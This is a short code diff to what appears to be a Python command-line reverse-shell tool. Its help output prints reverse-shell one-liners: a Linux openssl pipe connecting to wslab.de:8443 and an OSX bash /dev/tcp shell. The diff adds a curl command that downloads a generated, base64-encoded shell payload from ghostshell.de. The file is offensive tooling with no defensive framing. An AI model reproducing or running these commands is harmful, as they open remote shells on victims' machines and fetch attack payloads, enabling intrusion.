@@ -93,6 +93,9 @@ class MyPrompt(Cmd):
         print("OS (LINUX): mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect wslab.de:8443 > /tmp/s; rm /tmp/s") 
         print("OS (OSX): bash -c \"bash -i >& /dev/tcp/<ip>/<port> 0>&1\"") 
         print("")
+        print("Generate payload:")
+        print("curl -X GET -G https://ghostshell.de/payloads/gen_payload.php -d ip=wslab.de -d port=6666 -d os=osx -d enc=base64 -o shell.sh")
+        print("")
 
     def do_exit(self, inp):
         print("Bye")
